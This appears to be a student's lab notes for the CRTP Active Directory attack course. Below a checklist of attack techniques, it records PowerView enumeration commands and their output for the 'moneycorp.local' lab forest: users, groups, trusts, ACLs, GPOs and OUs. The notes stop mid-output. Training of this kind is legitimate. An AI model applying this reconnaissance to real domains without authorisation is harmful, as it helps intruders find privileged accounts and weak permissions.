# CRTP Exam Simulation

## Tasks

- [x] Domain Enumeration
	- [x] Domain Enumeration | Forests, Domains, Trusts (with PowerView)
	- [ ] Domain Enumeration | Users, Computers, Groups (with PowerView, BloodHound)
	- [ ] Domain Enumeration | ACLs, OUs, GPOs (with PowerView, BloodHound)
	- [ ] Domain Enumeration | Shares, Local Admin Access, Session Hunting (with PowerHuntShares, Find-PSRemotingLocalAdminAccess, Invoke-SessionHunter)
- [x] Local Privilege Escalation
	- [x] Local Privilege Escalation | Feature Abuse (with PowerUp, winPEAS, PrivEscCheck)
	- [x] Local Privilege Escalation | GPO Abuse (with Impacket's ntlmrelayx, GPOddity)
- [ ] Domain Privilege Escalation
	- [ ] Domain Privilege Escalation, Lateral Movement (with Invoke-SessionHunter, SafetyKatz, Rubeus, Invoke-Mimi, Runas, Find-PSRemotingLocalAdminAccess)
	- [x] Domain Privilege Escalation | Kerberoasting (with PowerView, Rubeus, John)
	- [x] Domain Privilege Escalation | Unconstrained Delegation + Coercion + DCSync (with PowerView, Rubeus, Find-PSRemotingLocalAdminAccess, MS-RPRN, SafetyKatz)
	- [x] Domain Privilege Escalation | Constrained Delegation + DCSync (with PowerView, Rubeus, SafetyKatz)
	- [x] Domain Privilege Escalation | Resource-based Constrained Delegation (with PowerView, Rubeus, SafetyKatz)
- [x] Domain Persistence
	- [x] Domain Persistence | Golden Ticket + DCSync (with Rubeus, SafetyKatz)
	- [x] Domain Persistence | Silver Ticket (with Rubeus, SafetyKatz)
	- [x] Domain Persistence | Diamond Ticket (with Rubeus)
	- [x] Domain Persistence | DSRM (with PowerView, Rubeus, SafetyKatz)
	- [x] Domain Persistence using ACLs | Replication Rights Abuse + DCSync (with PowerView, Rubeus, SafetyKatz)
	- [x] Domain Persistence using ACLs | Security Descriptors (with Rubeus, RACE)
- [ ] Cross Trust Attacks
	- [x] Cross Trust Attacks | Domains Trust Key Abuse (with Rubeus, SafetyKatz)
	- [x] Cross Trust Attacks | Child `krbtgt` Key Hash Abuse (with Rubeus)
	- [x] Cross Trust Attacks | Forests Trust Key Abuse (with Rubeus, SafetyKatz)
	- [x] Cross Trust Attacks | AD CS Abuse - ESC1 + ESC3 (with Certify, Rubeus)
	- [x] Cross Trust Attacks | MSSQL Database Links Abuse (with PowerUpSQL, Invoke-PowerShellTcpEx)
	- [ ] Cross Trust Attacks | MSSQL Database Links Abuse + OPSEC (with ...)

---

## Lab Solution

### Domain Enumeration

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

#### Domain Enumeration | Forests, Domains, Trusts (with PowerView)

**Domain Enumeration | Forests**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`Get-Domain`:
```
Forest                  : moneycorp.local🏰
DomainControllers       : {dcorp-dc.dollarcorp.moneycorp.local}
Children                : {us.dollarcorp.moneycorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : moneycorp.local
PdcRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
RidRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
InfrastructureRoleOwner : dcorp-dc.dollarcorp.moneycorp.local
Name                    : dollarcorp.moneycorp.local🏛️
```

`Get-Forest`:
```
RootDomainSid         : S-1-5-21-335606122-960912869-3279953914
Name                  : moneycorp.local🏰
Sites                 : {Default-First-Site-Name}
Domains               : {dollarcorp.moneycorp.local🏛️, moneycorp.local🏛️, us.dollarcorp.moneycorp.local🏛️}
GlobalCatalogs        : {mcorp-dc.moneycorp.local, dcorp-dc.dollarcorp.moneycorp.local, us-dc.us.dollarcorp.moneycorp.local}
ApplicationPartitions : {DC=ForestDnsZones,DC=moneycorp,DC=local, DC=DomainDnsZones,DC=us,DC=dollarcorp,DC=moneycorp,DC=local, DC=DomainDnsZones,DC=dollarcorp,DC=moneycorp,DC=local,
                        DC=DomainDnsZones,DC=moneycorp,DC=local}
ForestModeLevel       : 7
ForestMode            : Unknown
RootDomain            : moneycorp.local🏛️
Schema                : CN=Schema,CN=Configuration,DC=moneycorp,DC=local
SchemaRoleOwner       : mcorp-dc.moneycorp.local
NamingRoleOwner       : mcorp-dc.moneycorp.local
```

**Domain Enumeration | Domains**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`Get-ForestDomain -Verbose`:
```
Forest                  : moneycorp.local
DomainControllers       : {dcorp-dc.dollarcorp.moneycorp.local}🖥️
Children                : {us.dollarcorp.moneycorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : moneycorp.local
PdcRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
RidRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
InfrastructureRoleOwner : dcorp-dc.dollarcorp.moneycorp.local
Name                    : dollarcorp.moneycorp.local🏛️

Forest                  : moneycorp.local
DomainControllers       : {mcorp-dc.moneycorp.local}🖥️
Children                : {dollarcorp.moneycorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : mcorp-dc.moneycorp.local
RidRoleOwner            : mcorp-dc.moneycorp.local
InfrastructureRoleOwner : mcorp-dc.moneycorp.local
Name                    : moneycorp.local🏛️

Forest                  : moneycorp.local
DomainControllers       : {us-dc.us.dollarcorp.moneycorp.local}🖥️
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : dollarcorp.moneycorp.local
PdcRoleOwner            : us-dc.us.dollarcorp.moneycorp.local
RidRoleOwner            : us-dc.us.dollarcorp.moneycorp.local
InfrastructureRoleOwner : us-dc.us.dollarcorp.moneycorp.local
Name                    : us.dollarcorp.moneycorp.local🏛️
```

**Domain Enumeration | Trusts**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`Get-DomainTrust`:
```
SourceName      : dollarcorp.moneycorp.local🏛️
TargetName      : moneycorp.local🏛️
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST🔗
TrustDirection  : Bidirectional🔗
WhenCreated     : 11/12/2022 5:59:01 AM
WhenChanged     : 2/6/2025 5:09:45 AM

SourceName      : dollarcorp.moneycorp.local🏛️
TargetName      : us.dollarcorp.moneycorp.local🏛️
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST🔗
TrustDirection  : Bidirectional🔗
WhenCreated     : 11/12/2022 6:22:51 AM
WhenChanged     : 3/3/2025 5:17:06 AM

SourceName      : dollarcorp.moneycorp.local🏛️
TargetName      : eurocorp.local🏰
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS🔗
TrustDirection  : Bidirectional🔗
WhenCreated     : 11/12/2022 8:15:23 AM
WhenChanged     : 3/3/2025 5:17:04 AM
```

`Get-ForestDomain -Forest 'eurocorp.local'`:
```
Forest                  : eurocorp.local🏰
DomainControllers       : {eurocorp-dc.eurocorp.local}🖥️
Children                : {eu.eurocorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : eurocorp-dc.eurocorp.local
RidRoleOwner            : eurocorp-dc.eurocorp.local
InfrastructureRoleOwner : eurocorp-dc.eurocorp.local
Name                    : eurocorp.local🏛️

Forest                  :
DomainControllers       :
Children                :
DomainMode              :
DomainModeLevel         :
Parent                  :
PdcRoleOwner            :
RidRoleOwner            :
InfrastructureRoleOwner :
Name                    : eu.eurocorp.local🏛️
```

`Get-ForestTrust -Forest 'moneycorp.local'`:
```
```
❌

| Forest             | Domain                            | Parent Domain                  | Domain Controllers                      | Trusts                                                             |
| ------------------ | --------------------------------- | ------------------------------ | --------------------------------------- | ------------------------------------------------------------------ |
| moneycorp.local 🏰 | moneycorp.local 🏛️               | -                              | mcorp-dc.moneycorp.local 🖥️             | -                                                                  |
| moneycorp.local 🏰 | dollarcorp.moneycorp.local 🏛️    | moneycorp.local 🏰             | dcorp-dc.dollarcorp.moneycorp.local 🖥️  | Bidirectional 🔗 with moneycorp.local 🏰                          |
| moneycorp.local 🏰 | us.dollarcorp.moneycorp.local 🏛️ | dollarcorp.moneycorp.local 🏛️ | us-dc.us.dollarcorp.moneycorp.local 🖥️   | Bidirectional 🔗 with dollarcorp.moneycorp.local 🏛️               |
| eurocorp.local 🏰  | eurocorp.local 🏛️                | -                              | eurocorp-dc.eurocorp.local 🖥️           | Bidirectional 🔗 with dollarcorp.moneycorp.local 🏛️ (FILTER_SIDS)  |
| eurocorp.local 🏰  | eu.eurocorp.local 🏛️             | eurocorp.local 🏛️             | -                                        | -                                                                  |

#### Domain Enumeration | Users, Computers, Groups (with PowerView, BloodHound)

**Domain Enumeration | Users**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`Get-DomainUser`:
```
pwdlastset                    : 11/11/2022 6:33:55 AM
logoncount                    : 10710
badpasswordtime               : 3/3/2025 12:31:46 AM
description                   : Built-in account for administering the computer/domain
distinguishedname             : CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass                   : {top, person, organizationalPerson, user}
lastlogontimestamp            : 2/24/2025 9:02:41 PM
samaccountname                : Administrator
logonhours                    : @{Tuesday=System.Collections.Hashtable; Friday=System.Collections.Hashtable; Wednesday=System.Collections.Hashtable; Saturday=System.Collections.Hashtable;
                                Thursday=System.Collections.Hashtable; Monday=System.Collections.Hashtable; Sunday=System.Collections.Hashtable}
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : 12/31/1600 4:00:00 PM
countrycode                   : 0
whenchanged                   : 2/25/2025 5:02:41 AM
instancetype                  : 4
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
objectguid                    : d954e824-f549-47c2-9809-646c218cef36
lastlogoff                    : 12/31/1600 4:00:00 PM
whencreated                   : 11/12/2022 5:59:01 AM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata         : {3/3/2025 8:36:57 AM, 3/3/2025 8:36:57 AM, 3/3/2025 7:36:57 AM, 3/3/2025 7:36:57 AM...}
usncreated                    : 8196
usnchanged                    : 1539187
memberof                      : {CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local, CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local,
                                CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local}
lastlogon                     : 3/3/2025 1:35:23 AM
badpwdcount                   : 0
cn                            : Administrator
msds-supportedencryptiontypes : 0
objectsid                     : S-1-5-21-719815819-3726368948-3917688648-500
primarygroupid                : 513
iscriticalsystemobject        : True
name                          : Administrator

[SNIP]
```

`whoami`:
```
dcorp\student422
```

`Get-DomainUser -Name 'student422'`:
```
logoncount            : 64
badpasswordtime       : 3/3/2025 2:34:58 AM
distinguishedname     : CN=student422,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : student422
lastlogontimestamp    : 3/1/2025 9:13:36 PM
userprincipalname     : student422@dollarcorp.moneycorp.local
samaccountname        : student422
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 3/2/2025 5:13:36 AM
instancetype          : 4
usncreated            : 307616
objectguid            : 3c631361-8660-452d-849c-59269b9c99fc
lastlogoff            : 12/31/1600 4:00:00 PM
whencreated           : 1/16/2025 3:59:30 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata : {1/16/2025 3:59:30 PM, 1/1/1601 12:00:00 AM}
givenname             : student422
usnchanged            : 1561497
memberof              : CN=RDP Users👥,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
lastlogon             : 3/3/2025 2:16:11 AM
badpwdcount           : 2158
cn                    : student422👤
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
objectsid             : S-1-5-21-719815819-3726368948-3917688648-20607
primarygroupid        : 513
pwdlastset            : 1/16/2025 7:59:38 AM
name                  : student422
```

`Get-DomainUser | select -ExpandProperty samaccountname`:
```
Administrator
Guest
krbtgt
sqladmin
websvc
srvadmin
appadmin
svcadmin
testda
mgmtadmin
ciadmin
sql1admin
studentadmin
devopsadmin

[SNIP]

student416

[SNIP]

Control416user

[SNIP]

Support416user

[SNIP]

VPN416user

[SNIP]
```

**Domain Enumeration | Computers**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`Get-DomainComputer | select -ExpandProperty samaccountname`:
```
DCORP-DC$
DCORP-ADMINSRV$
DCORP-APPSRV$
DCORP-CI$
DCORP-MGMT$
DCORP-MSSQL$
DCORP-SQL1$
DCORP-STDADMIN$

[SNIP]

DCORP-STD416$

[SNIP]
```

`Get-DomainComputer | select -ExpandProperty dnshostname`:
```
dcorp-dc.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
dcorp-stdadmin.dollarcorp.moneycorp.local

[SNIP]
```

`notepad C:\AD\Tools\servers.txt`:
```
dcorp-dc.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
dcorp-stdadmin.dollarcorp.moneycorp.local
```

**Domain Enumeration | Groups**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`Get-DomainGroup | select -ExpandProperty samaccountname`:
```
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
Storage Replica Administrators
Domain Computers
Domain Controllers
Cert Publishers
Domain Admins
Domain Users
Domain Guests
Group Policy Creator Owners
RAS and IAS Servers
Server Operators
Account Operators
Pre-Windows 2000 Compatible Access
Windows Authorization Access Group
Terminal Server License Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
DnsAdmins
DnsUpdateProxy
RDPUsers
```

`Get-DomainGroup -Identity 'Domain Admins'`:
```
grouptype              : GLOBAL_SCOPE, SECURITY
admincount             : 1
iscriticalsystemobject : True
samaccounttype         : GROUP_OBJECT
samaccountname         : Domain Admins👥
whenchanged            : 11/14/2022 5:06:37 PM
objectsid              : S-1-5-21-719815819-3726368948-3917688648-512
name                   : Domain Admins
cn                     : Domain Admins
instancetype           : 4
usnchanged             : 40124
dscorepropagationdata  : {3/3/2025 9:36:57 AM, 3/3/2025 8:36:57 AM, 3/3/2025 7:36:57 AM, 3/3/2025 6:36:57 AM...}
objectguid             : 7d766421-bcf7-40b1-a970-17da0bedb489
description            : Designated administrators of the domain
memberof               : {CN=Denied RODC Password Replication Group,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local, CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local}
member                 : {CN=svc admin👤,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local, CN=Administrator👤,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local}
usncreated             : 12315
whencreated            : 11/12/2022 5:59:41 AM
distinguishedname      : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass            : {top, group}
objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

`Get-DomainGroupMember -Identity 'Domain Admins'`:
```
GroupDomain             : dollarcorp.moneycorp.local
GroupName               : Domain Admins👥
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
MemberDomain            : dollarcorp.moneycorp.local
MemberName              : svcadmin👤
MemberDistinguishedName : CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-719815819-3726368948-3917688648-1118

GroupDomain             : dollarcorp.moneycorp.local
GroupName               : Domain Admins👥
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
MemberDomain            : dollarcorp.moneycorp.local
MemberName              : Administrator👤
MemberDistinguishedName : CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-719815819-3726368948-3917688648-500
```

`Get-DomainGroupMember -Identity 'Enterprise Admins'`:
```
```
❌

`Get-DomainGroupMember -Identity 'Enterprise Admins' -Domain 'moneycorp.local'`:
```
GroupDomain             : moneycorp.local
GroupName               : Enterprise Admins👥
GroupDistinguishedName  : CN=Enterprise Admins,CN=Users,DC=moneycorp,DC=local
MemberDomain            : moneycorp.local
MemberName              : Administrator👑
MemberDistinguishedName : CN=Administrator,CN=Users,DC=moneycorp,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-335606122-960912869-3279953914-500
```

`Get-DomainGroupMember -Identity 'RDPUsers'`:
```
GroupDomain             : dollarcorp.moneycorp.local
GroupName               : RDPUsers👥
GroupDistinguishedName  : CN=RDP Users,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
MemberDomain            : dollarcorp.moneycorp.local
MemberName              : student422👤
MemberDistinguishedName : CN=student435,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-719815819-3726368948-3917688648-20620

[SNIP]
```

#### Domain Enumeration | ACLs, OUs, GPOs (with PowerView, BloodHound)

**Domain Enumeration | ACLs**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'student422'}`:
```
```
❌

`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'Domain Admins'}`:
```
```
❌

`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'RDPUsers'}`:
```
[SNIP]

ObjectDN                : CN={0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}📑,CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll📑
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-719815819-3726368948-3917688648-1123
IdentityReferenceName   : RDPUsers👥
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN     : CN=RDP Users,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass  : group

[SNIP]
```

`Get-DomainGPO -Identity '{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}'`:
```
flags                    : 0
displayname              : Applocker📑
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{62C1845D-C4A6-4ACB-BBB0-C895FD090385}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 1/6/2025 8:33:19 AM
versionnumber            : 15
name                     : {0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}
cn                       : {0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}📑
usnchanged               : 303528
dscorepropagationdata    : {1/6/2025 8:33:19 AM, 12/18/2024 8:31:49 AM, 12/18/2024 8:31:01 AM, 12/18/2024 8:30:36 AM...}
objectguid               : bcf4770b-b560-468b-88cb-6beaeb6793f9
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}
distinguishedname        : CN={0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 11/15/2022 4:21:20 AM
showinadvancedviewonly   : True
usncreated               : 45231
gpcfunctionalityversion  : 2
instancetype             : 4
objectclass              : {top, container, groupPolicyContainer}
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

BloodHound...

``:
```

```

**Domain Enumeration | OUs**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`Get-DomainOU`:
```
description            : Default container for domain controllers
systemflags            : -1946157056
iscriticalsystemobject : True
gplink                 : [LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local;0]
whenchanged            : 11/12/2022 5:59:00 AM
objectclass            : {top, organizationalUnit}
showinadvancedviewonly : False
usnchanged             : 7921
dscorepropagationdata  : {12/5/2024 12:47:28 PM, 11/15/2022 3:49:24 AM, 11/12/2022 5:59:41 AM, 1/1/1601 6:12:17 PM}
name                   : Domain Controllers🗂️
distinguishedname      : OU=Domain Controllers,DC=dollarcorp,DC=moneycorp,DC=local
ou                     : Domain Controllers
usncreated             : 7921
whencreated            : 11/12/2022 5:59:00 AM
instancetype           : 4
objectguid             : 802da67f-f1f8-40a7-9d13-7e76ccb25e39
objectcategory         : CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

usncreated            : 44996
displayname           : StudentMachines
gplink                : [LDAP://cn={7478F170-6A0C-490C-B355-9E4618BC785D},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
whenchanged           : 11/15/2022 5:46:19 AM
objectclass           : {top, organizationalUnit}
usnchanged            : 45933
dscorepropagationdata : {12/5/2024 12:47:28 PM, 11/15/2022 3:49:24 AM, 11/15/2022 3:49:24 AM, 1/1/1601 12:00:01 AM}
name                  : StudentMachines🗂️
distinguishedname     : OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local
ou                    : StudentMachines
whencreated           : 11/15/2022 3:49:24 AM
instancetype          : 4
objectguid            : 1c7cd8cb-d8bb-412f-9d76-9cff8afa021f
objectcategory        : CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

usncreated            : 45190
name                  : Applocked🗂️
gplink                : [LDAP://cn={0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
whenchanged           : 11/15/2022 4:21:20 AM
objectclass           : {top, organizationalUnit}
usnchanged            : 45237
dscorepropagationdata : {12/5/2024 12:47:28 PM, 11/15/2022 4:16:38 AM, 1/1/1601 12:00:01 AM}
distinguishedname     : OU=Applocked,DC=dollarcorp,DC=moneycorp,DC=local
ou                    : Applocked
whencreated           : 11/15/2022 4:16:38 AM
instancetype          : 4
objectguid            : e33cfcdb-8c09-4a51-a0bf-c67815e72615
objectcategory        : CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

[SNIP]

usncreated            : 293036
name                  : DevOps🗂️
gplink                : [LDAP://cn={0BF8D01C-1F62-4BDC-958C-57140B67D147},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
whenchanged           : 12/24/2024 7:08:45 AM
objectclass           : {top, organizationalUnit}
usnchanged            : 296492
dscorepropagationdata : {12/18/2024 7:28:35 AM, 1/1/1601 12:00:00 AM}
distinguishedname     : OU=DevOps,DC=dollarcorp,DC=moneycorp,DC=local
ou                    : DevOps
whencreated           : 12/18/2024 7:28:35 AM
instancetype          : 4
objectguid            : 6659e940-fadf-4dc4-9eb7-3852bb441a52
objectcategory        : CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

[SNIP]
```

`Get-DomainOU | select -ExpandProperty name`:
```
Domain Controllers🗂️
StudentMachines🗂️
Applocked🗂️
Servers🗂️
DevOps🗂️
```

`Get-DomainObject -SearchBase "OU=AppLocked,DC=dollarcorp,DC=moneycorp,DC=local" -Verbose`:
```
[SNIP]

usncreated            : 45190
name                  : Applocked🗂️
gplink                : [LDAP://cn={0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
whenchanged           : 11/15/2022 4:21:20 AM
objectclass           : {top, organizationalUnit}
usnchanged            : 45237
dscorepropagationdata : {12/5/2024 12:47:28 PM, 11/15/2022 4:16:38 AM, 1/1/1601 12:00:01 AM}
distinguishedname     : OU=Applocked,DC=dollarcorp,DC=moneycorp,DC=local
ou                    : Applocked
whencreated           : 11/15/2022 4:16:38 AM
instancetype          : 4
objectguid            : e33cfcdb-8c09-4a51-a0bf-c67815e72615
objectcategory        : CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

pwdlastset                    : 11/11/2022 11:16:12 PM
logoncount                    : 98
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=DCORP-ADMINSRV,OU=Applocked,DC=dollarcorp,DC=moneycorp,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 2/24/2025 9:03:21 PM
whencreated                   : 11/12/2022 7:16:12 AM
samaccountname                : DCORP-ADMINSRV$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 2/25/2025 5:03:21 AM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2022 Datacenter
instancetype                  : 4
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
objectguid                    : 2e036483-7f45-4416-8a62-893618556370
operatingsystemversion        : 10.0 (20348)
lastlogoff                    : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto      : {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata         : {12/5/2024 12:47:28 PM, 11/15/2022 4:16:45 AM, 1/1/1601 12:00:01 AM}
serviceprincipalname          : {WSMAN/dcorp-adminsrv, WSMAN/dcorp-adminsrv.dollarcorp.moneycorp.local, TERMSRV/DCORP-ADMINSRV, TERMSRV/dcorp-adminsrv.dollarcorp.moneycorp.local...}
usncreated                    : 13891
usnchanged                    : 1539261
lastlogon                     : 3/3/2025 3:04:00 AM
badpwdcount                   : 0
cn                            : DCORP-ADMINSRV🖥️
msds-supportedencryptiontypes : 28
objectsid                     : S-1-5-21-719815819-3726368948-3917688648-1105
primarygroupid                : 515
iscriticalsystemobject        : False
name                          : DCORP-ADMINSRV
dnshostname                   : dcorp-adminsrv.dollarcorp.moneycorp.local

[SNIP]
```

`(Get-DomainOU -Identity 'Applocked').distinguishedname | %{Get-DomainComputer -SearchBase $_} | select -ExpandProperty name`:
```
DCORP-ADMINSRV🖥️
```

`Get-DomainObject -SearchBase "OU=DevOps,DC=dollarcorp,DC=moneycorp,DC=local" -Verbose`:
```
usncreated            : 293036
name                  : DevOps🗂️
gplink                : [LDAP://cn={0BF8D01C-1F62-4BDC-958C-57140B67D147},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
whenchanged           : 12/24/2024 7:08:45 AM
objectclass           : {top, organizationalUnit}
usnchanged            : 296492
dscorepropagationdata : {12/18/2024 7:28:35 AM, 1/1/1601 12:00:00 AM}
distinguishedname     : OU=DevOps,DC=dollarcorp,DC=moneycorp,DC=local
ou                    : DevOps
whencreated           : 12/18/2024 7:28:35 AM
instancetype          : 4
objectguid            : 6659e940-fadf-4dc4-9eb7-3852bb441a52
objectcategory        : CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

pwdlastset                    : 3/3/2025 2:47:06 AM
logoncount                    : 445
badpasswordtime               : 3/2/2025 9:06:34 PM
distinguishedname             : CN=DCORP-CI,OU=DevOps,DC=dollarcorp,DC=moneycorp,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 2/24/2025 9:04:34 PM
samaccountname                : DCORP-CI$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 3/3/2025 10:47:06 AM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2022 Datacenter
instancetype                  : 4
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
objectguid                    : 104dcc70-8ff9-4d64-b411-d60ef2a1374f
operatingsystemversion        : 10.0 (20348)
lastlogoff                    : 12/31/1600 4:00:00 PM
whencreated                   : 11/12/2022 7:22:08 AM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
